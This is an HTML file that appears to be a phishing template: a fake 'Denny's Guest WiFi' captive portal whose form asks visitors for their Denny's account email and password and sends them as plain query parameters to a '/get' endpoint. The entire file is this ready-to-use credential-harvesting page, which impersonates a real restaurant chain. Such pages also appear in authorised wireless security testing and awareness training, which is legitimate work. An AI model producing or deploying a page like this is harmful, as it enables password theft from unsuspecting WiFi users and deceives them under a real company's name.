<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#FFCC00;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.dylogo{text-align:center;margin-bottom:20px}
.dylogo h1{font-size:32px;font-weight:900;color:#1a1a1a;letter-spacing:0.5px}
.dylogo p{font-size:11px;color:#555;letter-spacing:1.5px;text-transform:uppercase;margin-top:4px}
.card{background:#fff;width:100%;max-width:400px;border-radius:16px;overflow:hidden;box-shadow:0 16px 48px rgba(0,0,0,0.15)}
.ch{background:#1a1a1a;padding:18px 24px;text-align:center}
.ch h1{font-size:16px;font-weight:800;color:#FFCC00}.ch p{font-size:12px;color:#aaa;margin-top:3px}
.cb{padding:24px}
.lbl{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.8px;color:#888;margin-bottom:6px;margin-top:14px}
input{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:15px;background:#fafafa;color:#1a1a1a}
input:focus{outline:none;border-color:#FFCC00;box-shadow:0 0 0 3px rgba(255,204,0,0.2)}
input::placeholder{color:#c0c0c0}
.terms{font-size:11px;color:#aaa;line-height:1.5;margin-top:14px}.terms a{color:#1a1a1a}
.btn{width:100%;padding:13px;border:none;border-radius:10px;background:#1a1a1a;color:#FFCC00;font-size:14px;font-weight:800;cursor:pointer;margin-top:14px}
</style>
</head>
<body>
<div class="dylogo"><h1>Denny's</h1><p>America's Diner &bull; Free WiFi</p></div>
<div class="card">
  <div class="ch"><h1>Denny's Guest WiFi</h1><p>Sign in to connect</p></div>
  <div class="cb">
    <form action="/get">
      <label class="lbl">Denny's Account Email</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <p class="terms">By connecting you agree to <a href="#">Denny's Terms of Use</a>.</p>
      <button type="submit" class="btn">Connect to WiFi</button>
    </form>
  </div>
</div>
</body>
</html>
